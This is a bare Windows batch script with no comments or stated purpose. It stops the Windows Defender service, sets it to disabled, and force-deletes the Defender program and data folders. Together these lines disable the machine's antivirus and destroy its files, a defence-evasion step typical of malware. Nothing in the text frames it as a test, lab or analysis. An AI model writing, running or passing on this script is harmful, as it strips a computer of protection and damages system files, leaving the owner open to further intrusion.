@echo off
net stop WinDefend
sc config WinDefend start= disabled
del /f /s /q "%ProgramFiles%\Windows Defender"
del /f /s /q "%ProgramData%\Microsoft\Windows Defender"